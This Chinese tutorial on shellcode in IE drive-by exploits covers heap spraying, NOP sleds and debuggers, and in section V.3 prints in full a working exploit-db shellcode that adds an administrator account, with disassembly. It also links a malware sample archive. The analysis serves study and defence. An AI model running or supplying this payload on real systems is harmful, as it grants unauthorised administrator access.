# IE安全系列：脚本先锋（III）--网马中的Shellcode

本文V.1，V.2两节也将尽量只从脚本的角度来解释部分内容，第三部分将从实例中简单总结一下通用SHELLCODE的实现方法。 下一章脚本先锋IV中，将介绍简单的shellcode分析方式。至于与其他系统安全机制结合起来的内容，“脚本先锋”系列中暂时就不提了，而将留在后续章节中介绍。

V.1 何为Shellcode，调试工具简单介绍（OD、Windbg）
===================================

* * *

shellcode本是指获得一个shell的代码，也或者是达到特定目的的代码，网马中利用IE漏洞的“Shellcode”一词，大多数就是指这样的代码集合

![enter image description here](http://drops.javaweb.org/uploads/images/ff736fb8da849330c123544b8c1fc80a1260f0d1.jpg)

图：PE文件中字节和对应的反汇编语句

诚如所见，如果要通过机器码实行一段有意义的操作，代码中很可能会包含非可打印字符、扩展字符。其中，特别是扩展字符可能因为用户机器语言环境不同产生歧义。如下图，如果采用明文的方式，4个字节的内容在用户机器上长度会被判断为3（中文系统默认设置为例），这会导致在铺设shellcode时长度无法准确计算，在利用漏洞时会产生大量的不便。

![enter image description here](http://drops.javaweb.org/uploads/images/20fd1d0ee24bffb032467e5f99a8132f88616933.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/2881ad35993b6e74353bac037321ce68fb5ed5d9.jpg)

因此在布置shellcode时通常都会将其escape编码。escape很简单，也即将字符重新改为字符的ASCII值的十六进制形式，并加上百分号。

Unescape能解开的数据有多种形式，常见的为：

`%XX`，XX为字符的ASCII值；

`%uAABB`，`AABB`为unicode字符的ASCII值，如果要把这个结果当成多字节数据来处理时，此时相当于%BB%AA；

以下并不算严格的“解开”，但是也算是一种编码格式，因此也包含进去了：

`\OO`、`\xHH`，最普通的字符串转义形式，即类C语法中的\转义符号（最常见的比如`\n`、`\r`、`\0`）；

\uAABB，同%u。

escape不会对字母和数字进行编码，也不会对`* @ - _ + . /`这些字符编码。其他所有的字符都会被转义序列替换。

unesacpe则会对所有的符合上述“能解开”的内容进行解码。

例如字符”|”，其ASCII值为124 （0x7c），经过ESCAPE编码之后则为`%7C`。

在网马中还会出现一个名词，这里单独介绍一下：

`NOP sled`（或者slide，slice）: 指不会对代码执行产生太大影响的内容。或者至少是对要执行的shellcode不会影响太大的内容。

例如：

`·nop`（`0x90`，但是喷射起来可能不是多方便，毕竟如果是想要覆盖某些对象的虚表，那么`0x90909090`这个地址必然是个不可能完成的任务，因为这个已经是内核态地址了，如果只是普通的缓冲区溢出使用这个也未尝不可）

`·or al`,`0c`（`0x0c0c`， 2字节的sled，比较方便也极为常见，即使一路喷过去，最理想情况所需内存也不过160M而已，虽然实际肯定会大一些）

`·or eax`,`0d0d0d0d`（`0x0d 0x0d0d0d0d`，5字节，可能导致对齐问题，但是由于不常见也不一定会被内存检测工具检测到），等等。

通过内存喷射覆盖某个已经释放了的对象后，该对象的内存看起来会像：

![enter image description here](http://drops.javaweb.org/uploads/images/0ecb2946cad3a53ed1443b9fa4f3c853f4adce03.jpg)

图：变量0x35fb03是某个class，free后该class的内存重新被nop sled占据，当该对象内的成员函数被重新使用时，EIP将变为`0x0c0c0c0c+offset`。

![enter image description here](http://drops.javaweb.org/uploads/images/2a1bba7b2d9211cb58cb433b2a49dc0fbbeafabd.jpg)

而0c0c0c0c处，则安排着有我们的shellcode，当然上面这个只是演示，所以放了一堆A在里面。

由于0x0c0c只是会操作eax，一般不会产生什么大影响，所以就可以任由它这么覆盖下去，而由于它是2个字节的，所以相比非主流的0x0d对齐时“性价比”比较好。

![enter image description here](http://drops.javaweb.org/uploads/images/f7bad87a3f805c05796d6e7f2e90be8b109243dd.jpg)

图：在Visual Studio 2008中模拟堆喷覆盖一个已释放的类的虚表

如果你也要做类似简单的试验，建议不要在2011之后的Visual Studio中去做，在这里面会变得比较麻烦，2011中delete操作删除一个对象后，该对象的地址会被置为`0x8123`。导致难以复现上述现象。

至于`0x8123`这个值也许之后可能大家会在分析其他软件的时候发现，简单介绍一下微软的做法：

微软在VS11 Beta中引入了这个功能，使用`0x8123`来解决UAF的问题，它的处理方案是相当于将原来的：

```
delete p;

```

一句话给扩展为：

```
delete p; 
(void*)p = (void*)0x00008123;

```

两句。

而通常，程序员所写的正确的释放过程应当为

```
delete p; p = NULL;

```

经过插入后变为了

```
delete p; (void*)p = (void*)0x00008123; p = NULL;

```

三句。

在编译器眼里，这三句中，由于后两句都是给同一个变量赋常量值，因而又会被自动优化为两句

```
delete p; p=NULL; 

```

看到了吧，如果正确释放，VS插入的这句不会影响最终生成结果，而如果程序员忘记了p=NULL一句，最终结果将变为：

```
delete p;  (void*)p = (void*)0x00008123; 

```

而`0x00008123`位于Zero Pages（第0～15页，地址范围`0x0~ 0x0000FFFF`）中，因而如果被访问到会导致程序触发存取违例，因而这个地址可以被视为安全的。相对于更加频繁出现的访问`0x00000000`造成的空指针引用崩溃，如果程序员看到程序是访问了`0x00008123`崩溃了，那么立马就应该知道是发生了释放后引用的问题。这里的内容具体可参考(1]。

Javascript堆喷的详细内容具体可以参考《Heap fengshui in Javascript》一文。(2]之后的章节中我们也会介绍。

针对二进制数据的调试，常见的工具有OllyDbg、Windbg、IDA等等。个人习惯使用Windbg+IDA，二者的功能都相当强悍，当然，OllyDbg由于界面多彩，动态调试的时候也是可以大幅提高工作效率的。

现在大致介绍一下这三个工具的最简单功能，参考资料(3]有一些相关书目，如果有兴趣的话可以参考一下这些书。

声明：以下工具限于使用时长和环境等因素，介绍可能带有个人的感情色彩，仅供参考，请根据需要自行选择适合的工具。 OllyDbg：下载地址http://ollydbg.de ,Win7 建议使用OD2。

![enter image description here](http://drops.javaweb.org/uploads/images/58c5836afff056588107acc8b2e16343a39eb5e8.jpg)

OD支持插件，在无插件情况下，OD支持解析DLL的导出函数，设置Use Microsoft Symbol Server=1将从微软的Symbol服务器下载符号，但是似乎并不一定能解析成功，而且不支持显示从一个系统函数开始的偏移（但是点击地址行，可以转为$+X这样的相对地址），例如上图中ntdll.77279f72，在Windbg中能解析成如下可能的名称范围：

![enter image description here](http://drops.javaweb.org/uploads/images/c3b572fe2339c56012589d4477922c5be2e010ff.jpg)

但是OD中只能显示成地址。

该地址实际属于`ntdll!__RtlUserThreadStart`，在Windbg中可以方便的看出来：

![enter image description here](http://drops.javaweb.org/uploads/images/9b152f862135ecf7ed81ec5894d14996f6d1a721.jpg)

OD中Ctrl+G也不能显示偏移，跳转过去以后也不知道函数名：

![enter image description here](http://drops.javaweb.org/uploads/images/4494107ab6dc0131bc21c0f857cef0dcea7929f9.jpg)

OD会自动给你停在函数入口点（如果设置里面有这么设置的话），Windbg和IDA默认则不会。而且OD的着色系统应该是这三者中最清晰的了，调试操作为：

F7：步入（Step-in），即如果当前语句是call ADDRESS的时候，按下F7后光标会停在该函数（ADDRESS）内；

F8：步过（Step-over），运行到下一条语句，如果当前语句是call ADDRESS，按下F8后会等这个函数执行完成，然后停在call ADDRESS后面一条的语句处；

F2：设置断点，有断点的地方会显示红色：

![enter image description here](http://drops.javaweb.org/uploads/images/30cfa982cc83f8eed0b616745fbe1dfbe9504ad1.jpg)

调试断点（int3）会让语句在执行到断点处时抛出异常，调试器收到之后就可以停在那条语句上了。这在调试一个LOOP的时候非常有用，毕竟，如果一个LOOP要循环999次，你可不会想F8 999次吧，这时只需在LOOP外设置断点，然后运行程序即可。

F9：执行程序，可以配合F2用；执行的时候程序就跑起来了，不出意外不会停止的，所以如果在调试恶意代码请注意不要随意的用这个命令；

Ctrl+F9：执行到返回。执行到当前函数的RETN为止；

F4：相当于F2+F9，先下断点再执行；如果你的断点是死代码（任何分支都不会走到上面去，那程序就跑起来了，也就是俗称的跑飞了）；

例如伪代码：

```
IF (1)
      DO SOMETHING
ELSE
      DO OTHER THING  //DEAD

```

Windbg：Windbg跟随着微软的WDK而来，可以在安装WDK时一并选上安装，同时也可以单独下载，具体的百度一下即可。Windbg分为32、64位版本，建议都装上。

Windbg是文字界面，也许刚开始有些人会不适应，但是如果你用多了，你会发现这个东西真的是一个神器。

![enter image description here](http://drops.javaweb.org/uploads/images/aa61ae9af05a14fe4431269c10c544e8e87c1f4f.jpg)

以下是常用命令：

`.symfix`以及`.reload`。 设置符号文件为默认的微软符号服务器，然后重新载入符号，这时，如果有对应符号，之前显示地址的内容就会显示成函数名，看起来十分方便。

如果有私有符号和源代码，可以通过`.sympath+`和`.reload`来载入，这时可以同时对比源代码调试，在应付程序崩溃时非常有用。

```
p，步过。
t，步入。
g，执行。
pct，执行到下一个call或者ret。
k，显示栈回溯。
kvn，显示栈回溯，包括参数等信息。
~*k，显示所有线程的栈回溯。
!analyze -v，分析崩溃原因（崩溃时用）。
bp，设置断点。
bc，清除断点。
bl，显示断点。

```

具体的也可以参考Windbg的帮助文档。

IDA：IDA是一个非常有用的静态动态分析工具，它的静态分析支持显示函数的结构:

![enter image description here](http://drops.javaweb.org/uploads/images/9e00db924bba821e93880da1e7ac469bb010dede.jpg)

同时，插件可以支持生成伪代码（但是并不一定完全正确，仅供参考）：

![enter image description here](http://drops.javaweb.org/uploads/images/e82cb95a59bb66192bb951783b564e56a8ba0abf.jpg)

同时其对微软的符号也支持的相当不错，要打开符号支持，编辑`cfg/pdb.cfg`即可指定符号服务器。如果之前没有设置，IDA最初可能还会提示你使用微软的符号服务器，所以可以不必太在意。

![enter image description here](http://drops.javaweb.org/uploads/images/f8c37bea2e8c8d0a8e22dbe35bd05c5fb93a6ea7.jpg)

IDA的动态调试功能支持bochs、win32 debugger、gdb、windbg：

![enter image description here](http://drops.javaweb.org/uploads/images/8f578aa67b49294229033444f859a57365018fae.jpg)

Bochs debugger需要bochs安装，然后IDA会使用bochsdbg.exe来完成动态调试。

★IDA里如果你不设置断点就运行，程序是会直接跑起来的，不会停在任何地方，请注意！

Win32 debugger为例，操作大致同OD

F2在WinMain设置断点，然后运行：

![enter image description here](http://drops.javaweb.org/uploads/images/7d4f708a52c83887eb202c0b96c3a91442b9a3bd.jpg)

```
F8，步过。
F7，步入。
F9，运行。
F4，断点并运行，相当于F2+F9。

```

可以看得出来，按键几乎一致，不过它的符号支持要比OD强，加载了微软符号后甚至显示了各个Offset对应的含义：

![enter image description here](http://drops.javaweb.org/uploads/images/655c4a7542154eee7d8ae5e82c915592645ce43d.jpg)

而在od中结果替换掉的还是偏少：

![enter image description here](http://drops.javaweb.org/uploads/images/abb0455123d4a64812ec27645dbb5f210799ea44.jpg)

而且，IDA中很多强悍功能都绝不足以在一节内概括说清楚，具体请参阅参考资料(2]。

V.2 网马中的shellcode
=================

* * *

解密-获取下载地址，通过工具

在介绍完上述基本概念之后，我们再来介绍一下常量和变量的概念，这些简单的概念将有助于我们了解最简单的shellcode“解密”流程。

首先，常量，在编程语言中指不会变的量（虽然只要你想让它变它完全可以变），这里特指预设量，或者字面值。（英文是literal value，国内的书啊啥的都这么翻译，所以我也这么写了）。

简单的说，比如你要调用函数：`WinExec(“cmd.exe”, 1);`

stdcall的WinExec参数压栈顺序如下：首先压入最后一个参数1，然后压入倒数第二个参数”cmd.exe”。当然，这里压入的是它的地址。

汇编代码类似于：

```
PUSH 1
PUSH ADDRESS_OF_CMD.EXE
CALL WinExec

```

而这个ADDRESS_OF_CMD.EXE则就是指向内存中已经存放好的字符串”cmd.exe”的了。

如果不能理解，可以参考下图：

![enter image description here](http://drops.javaweb.org/uploads/images/f3d120e45a9285a594d90161d264319cc2c0885d.jpg)

请看，假设这片内存的初始地址是`0x00000000`（实际Win32并不可能，不过这里只是演示，不必在意），那么`CMD.EXE`字符串的位置实际上是`0x00000030`。

那么上述调用WinExec的代码，如果也可以访问这片内存，那么它的代码就可以是：

```
PUSH 1
PUSH 0x00000030
CALL WinExec

```

网马中WinExec是一个常用的函数，因为相对于`ShellExecute`、`CreateProcess`来说，它的代码更简短，当然这也造成了它更容易被检测查杀。 其他的函数还有`URLDownloadToFileA/W`，这是一个HTML成功溢出或者破坏浏览器内存之后首要要做的就是将木马EXE运行起来。而要保证Shellcode的长度，显然从服务器下载木马是最简单可行的。（我也见过直接WriteFile把木马写到硬盘上的，不过那段Shellcode简直大到令人发指。）

而`URLDownloadToFile`的第二个参数就是URL，因此这个URL极有可能也是明文存在SHELLCODE中的，找到这个地址无非对安全研究者比较重要，这对分析网马的完整危害有较大作用。

所以，让我们回到脚本，观察下列代码

![enter image description here](http://drops.javaweb.org/uploads/images/d152f4f60a553bbde611fb2185e6efb8993ca4d6.jpg)

阅读代码很容易就可以知道SC为最终处理完的Shellcode。

将SC输出，在浏览器中执行一下：

![enter image description here](http://drops.javaweb.org/uploads/images/40dfd6e72229009248dbb5b0cf77b344c4147da9.jpg)

即可拿到解密后的shellcode，简单的看一下，代码中出现了大量的重复内容：E2，而直接将内容Unescape也没有看到像样的明文，这时可以经验得出，这段代码是被XOR加密过的，因此可以在工具中填入密钥e2，然后解开即可看到常量部分，这个就是这段代码想要下载的文件

![enter image description here](http://drops.javaweb.org/uploads/images/40757b1ebcb632faeae5a128ab567caf216d6aa2.jpg)

这段代码的调试放到下章再说，不过并不难，而且这个URL也失效了，所以你也大可参照下一节(V.3)的相关内容，如果觉得一切合适了，可以放心大胆的调试。

V.3 Shellcode 123
=================

* * *

最后，简单介绍一下大家可能会比较在意的内容，这也是SHELLCODE编写的一个必备条件之一，即shellcode如何获得函数地址，更甚之，shellcode如何通用化呢？

先说一下如何手动获得一个系统函数的地址。

![enter image description here](http://drops.javaweb.org/uploads/images/5a859ee127586e84124200d85a3711d084766cf3.jpg)

图：`Dependency Walker`显示的`ShellExecuteA`导出函数的偏移量。用该值加上DLL的`Image Base`即可得到本机适用的函数地址（无ASLR情况下）。

![enter image description here](http://drops.javaweb.org/uploads/images/3708bfe3464c53cc855791df533d5a98f32df7f9.jpg)

图：shell32.dll (32bit, 6.1.7601.18762)的Image Base

如上图，无ASLR的环境下，该函数的地址是`0x73800000 + 0x247bcd = 0x73a47bcd`。

![enter image description here](http://drops.javaweb.org/uploads/images/796f3056815c5833eb30923f055d709779175735.jpg)

图：TencentDl.exe (32 bit)中的函数地址和模块起始地址。

`0x75547bcd - 0x247bcd = 0x75300000 =>`该模块当前的Image Base，这个值不同于文件声明的值的原因是开启了ASLR。

可以试验一下，`ShellExecuteExA`的偏移是`0x247b32`，则`0x75300000+0x247b32=0x75547b32`应该是该函数地址，查阅可知确实如此：

![enter image description here](http://drops.javaweb.org/uploads/images/d7dcbe8a8707acd71a9f0a5a8e74f18a4a8e3e5d.jpg)

但是除了上面的ASLR的情况，微软的库函数的地址自己也会随着系统变化、补丁更新等会发生变化，因此，硬编码一个地址必然是不行的，那么作为一个网马，如何才能做到让shellcode获取所需API的地址呢？

让我们参考一下exploit-db.com提供的shellcode (3]：

```
char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
      "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
      "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
      "\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a"
      "\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf"
      "\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f"
      "\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69"
      "\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"
      "\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
      "\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33"
      "\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65"
      "\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63"
      "\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7";

int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}

```

作者（Giuseppe D'Amore）提供了以上的代码供检验（代码来源：https://www.exploit-db.com/exploits/33836/）。作用是在所有系统下添加一个用户，效果如下：

![enter image description here](http://drops.javaweb.org/uploads/images/60385e7797ef0571874bd7262f910b506cc22ae4.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/8e53498d6f0b9f6ccc15613e9a90767fe09964bc.jpg)

图：同一个代码在x86 XP SP3、x64 Win7 SP1下均成功地添加了用户BroK3n。

具体是怎么实现的呢，可以手动编译一下上述C++程序，也可以通过工具来生成一个EXE测试：

![enter image description here](http://drops.javaweb.org/uploads/images/f964cbe7f0e5d7f29253043b85acabce1d8ea1f9.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/6288d032fd5c9fff86abc48f2c5f797afb0fafb8.jpg)

图：去除无效字符-生成EXE即可生成调试用程序

附：提取出来的ASCII值

```
31d2b230648b128b520c8b521c8b42088b72208b12807e0c3375f289c703783c8b577801c28b7a2001c731ed8b34af01c645813e57696e4575f28b7a2401c7668b2c6f8b7a1c01c78b7caffc01c7684b336e01682042726f682f414444686f727320687472617468696e6973682041646d68726f75706863616c676874206c6f6826206e656844442026686e202f4168726f4b3368336e20426842726f4b68736572206865742075682f63206e686578652068636d642e89e5fe4d5331c05055ffd7

```

让我们看一下反汇编后的结果：

```
0:000> uf image00400000+0x5000
Flow analysis was incomplete, some code may be missing
image00400000+0x5000:
00405000 31d2            xor     edx,edx
00405002 b230            mov     dl,30h
00405004 648b12          mov     edx,dword ptr fs:[edx]
00405007 8b520c          mov     edx,dword ptr [edx+0Ch]
0040500a 8b521c          mov     edx,dword ptr [edx+1Ch]

image00400000+0x500d:
0040500d 8b4208          mov     eax,dword ptr [edx+8]
00405010 8b7220          mov     esi,dword ptr [edx+20h]
00405013 8b12            mov     edx,dword ptr [edx]
00405015 807e0c33        cmp     byte ptr [esi+0Ch],33h
00405019 75f2            jne     image00400000+0x500d (0040500d)

image00400000+0x501b:
0040501b 89c7            mov     edi,eax
0040501d 03783c          add     edi,dword ptr [eax+3Ch]
00405020 8b5778          mov     edx,dword ptr [edi+78h]
00405023 01c2            add     edx,eax
00405025 8b7a20          mov     edi,dword ptr [edx+20h]
00405028 01c7            add     edi,eax
0040502a 31ed            xor     ebp,ebp

image00400000+0x502c:
0040502c 8b34af          mov     esi,dword ptr [edi+ebp*4]
0040502f 01c6            add     esi,eax
00405031 45              inc     ebp
00405032 813e57696e45    cmp     dword ptr [esi],456E6957h
00405038 75f2            jne     image00400000+0x502c (0040502c)

image00400000+0x503a:
0040503a 8b7a24          mov     edi,dword ptr [edx+24h]
0040503d 01c7            add     edi,eax
0040503f 668b2c6f        mov     bp,word ptr [edi+ebp*2]
00405043 8b7a1c          mov     edi,dword ptr [edx+1Ch]
00405046 01c7            add     edi,eax
00405048 8b7caffc        mov     edi,dword ptr [edi+ebp*4-4]
0040504c 01c7            add     edi,eax
0040504e 684b336e01      push    16E334Bh
00405053 682042726f      push    6F724220h
00405058 682f414444      push    4444412Fh
0040505d 686f727320      push    2073726Fh
00405062 6874726174      push    74617274h
00405067 68696e6973      push    73696E69h
0040506c 682041646d      push    6D644120h
00405071 68726f7570      push    70756F72h
00405076 6863616c67      push    676C6163h
0040507b 6874206c6f      push    6F6C2074h
00405080 6826206e65      push    656E2026h
00405085 6844442026      push    26204444h
0040508a 686e202f41      push    412F206Eh
0040508f 68726f4b33      push    334B6F72h
00405094 68336e2042      push    42206E33h
00405099 6842726f4b      push    4B6F7242h
0040509e 6873657220      push    20726573h
004050a3 6865742075      push    75207465h
004050a8 682f63206e      push    6E20632Fh
004050ad 6865786520      push    20657865h
004050b2 68636d642e      push    2E646D63h
004050b7 89e5            mov     ebp,esp
004050b9 fe4d53          dec     byte ptr [ebp+53h]
004050bc 31c0            xor     eax,eax
004050be 50              push    eax
004050bf 55              push    ebp
004050c0 ffd7            call    edi

```

针对代码的分析还是老样子，遵循按块来的原则。另外，如果目前为止你对阅读汇编代码还比较吃力，你也可以只看文字部分，了解个大概即可，之后还会详细说这块的内容的：

```
image00400000+0x5000:
00405000 31d2            xor     edx,edx
00405002 b230            mov     dl,30h
00405004 648b12          mov     edx,dword ptr fs:[edx]
00405007 8b520c          mov     edx,dword ptr [edx+0Ch]
0040500a 8b521c          mov     edx,dword ptr [edx+1Ch]

image00400000+0x500d:
0040500d 8b4208          mov     eax,dword ptr [edx+8]
00405010 8b7220          mov     esi,dword ptr [edx+20h]
00405013 8b12            mov     edx,dword ptr [edx]
00405015 807e0c33        cmp     byte ptr [esi+0Ch],33h
00405019 75f2            jne     image00400000+0x500d (0040500d)

```

这个循环所做的事情是：获取`kernel32.dll`的基址。

为何这段代码可以做到这点呢？

```
00405000 31d2            xor     edx,edx
00405002 b230            mov     dl,30h
00405004 648b12          mov     edx,dword ptr fs:[edx]

```

相当于`mov edx, dword ptr fs:[0x30]`，但是如果直接这么写会在里面混入`NULLCHAR，（MOV EDX,DWORD PTR FS:[30]`的机器码是`64 8B15 30000000）`，有损通用性，所以作者使用了这个方式。`FS:[0x30]`存放着PEB指针，因此这段代码执行后，edx即为PEB的指针。

```
00405007 8b520c          mov     edx,dword ptr [edx+0Ch]
0040500a 8b521c          mov     edx,dword ptr [edx+1Ch]

```

这两行代码的作用是获取`InInitializationOrderModuleList`的地址。这个里面存放着PE载入时初始化用到的模块信息。

具体看一下PEB的结构就知道

```
dt _PEB
ntdll!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsLegacyProcess  : Pos 2, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit
   +0x003 SpareBits        : Pos 5, 3 Bits
   +0x004 Mutant           : Ptr32 Void
   +0x008 ImageBaseAddress : Ptr32 Void
   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS

```

可见第一句获取了`_PEB_LDR_DATA`的指针，然后第二句就拿到了`InInitializationOrderModuleList`。

```
dt _PEB_LDR_DATA
ntdll!_PEB_LDR_DATA
   +0x000 Length           : Uint4B
   +0x004 Initialized      : UChar
   +0x008 SsHandle         : Ptr32 Void
   +0x00c InLoadOrderModuleList : _LIST_ENTRY
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY
   +0x024 EntryInProgress  : Ptr32 Void
   +0x028 ShutdownInProgress : UChar
   +0x02c ShutdownThreadId : Ptr32 Void

```

![enter image description here](http://drops.javaweb.org/uploads/images/d7bc3d40308595f33333d47edc3930210ad98574.jpg)

可以看到

![enter image description here](http://drops.javaweb.org/uploads/images/a2f1e4a8befb5092f3a55ad4f1321b8b6849ec5b.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/d23d403a379c3135847612cfca9e70f8ee3ac02b.jpg)

这个链表中就存着模块地址

```
image00400000+0x500d:
0040500d 8b4208          mov     eax,dword ptr [edx+8]
00405010 8b7220          mov     esi,dword ptr [edx+20h]
00405013 8b12            mov     edx,dword ptr [edx]
00405015 807e0c33        cmp     byte ptr [esi+0Ch],33h
00405019 75f2            jne     image00400000+0x500d (0040500d)

```

所以上述代码就在不断寻找`kernel32.dll`的地址，`edx+8`就是地址，`edx+20h`则为函数名字，`ASCII 0x33`是字符”3”，因此它在比较第7个字`（0xC == 12 (dec)）`是否为“3”，因为这些按顺序加载的模块也就`kernel32`在第七个字上是3了，所以这个还是比较准的。

![enter image description here](http://drops.javaweb.org/uploads/images/202085e5d9cb6a634ee8fb1d0055b03c4fa70f09.jpg)

接着，找到所需的导出函数： image00400000+0x501b: 0040501b 89c7 mov edi,eax 0040501d 03783c add edi,dword ptr [eax+3Ch] 00405020 8b5778 mov edx,dword ptr [edi+78h] 00405023 01c2 add edx,eax 00405025 8b7a20 mov edi,dword ptr [edx+20h] 00405028 01c7 add edi,eax 0040502a 31ed xor ebp,ebp

也就是上述代码所干的事情，找到kernel32地址之后，`+0x3C`就是PE头，PEHEADER处`+0x78`的地方是导出表的指针，导出表指针`+0x20`处是导出函数名的列表，教科书一样的操作。

```
image00400000+0x502c:
0040502c 8b34af          mov     esi,dword ptr [edi+ebp*4]
0040502f 01c6            add     esi,eax
00405031 45              inc     ebp
00405032 813e57696e45    cmp     dword ptr [esi],456E6957h
00405038 75f2            jne     image00400000+0x502c (0040502c)

```

然后，只要找到所需函数即可，这里作者需要的是包含`0x456e6957`的函数，

![enter image description here](http://drops.javaweb.org/uploads/images/9241d0345074dc0252f43d8e88fb997fe7f116e3.jpg)

事实上很简单就能猜到作者想要的是WinExec。

```
image00400000+0x503a:
0040503a 8b7a24          mov     edi,dword ptr [edx+24h]
0040503d 01c7            add     edi,eax
0040503f 668b2c6f        mov     bp,word ptr [edi+ebp*2]
00405043 8b7a1c          mov     edi,dword ptr [edx+1Ch]
00405046 01c7            add     edi,eax
00405048 8b7caffc        mov     edi,dword ptr [edi+ebp*4-4]
0040504c 01c7            add     edi,eax

```

事实上这里作者就计算出了函数的偏移+模块地址=函数地址，还记得半页纸前我说的“笨”计算方法吧。

```
0040504e 684b336e01      push    16E334Bh
00405053 682042726f      push    6F724220h
00405058 682f414444      push    4444412Fh
0040505d 686f727320      push    2073726Fh
00405062 6874726174      push    74617274h
00405067 68696e6973      push    73696E69h
…………

```

这一些就是之前所说的“常量”部分，

![enter image description here](http://drops.javaweb.org/uploads/images/b57f3516c3ed0db30993cf69ca05c08a86a732e5.jpg)

执行一下看看esp上存了啥吧，这样就一目了然了。最终，作者call esi，调用WinExec启动cmd，这样就添加上了用户。可惜作者没处理ExitProcess，最终程序的环境被弄得一塌糊涂，免不了崩溃收场。但是作者的目的达到了，用户都加上了，崩溃也无妨。

参考资料
====

* * *

(1] http://blogs.microsoft.com/cybertrust/2012/04/24/guarding-against-re-use-of-stale-object-references/

(2] heap fengshui in javascript： https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf

(3] 《Windows高级调试》（Windbg）、《IDA Pro权威指南》（IDA）、《逆向工程核心原理》部分章节（OllyDbg，内容非常基础向，并没有书名看起来那么高深:)）

(4] https://www.exploit-db.com/shellcode/

(5] 文中提到的相关恶意代码下载，密码 drops.wooyun.org，请在虚拟环境调试。[Downloads](http://drops.wooyun.org/wp-content/uploads/2015/05/malicious_v.rar)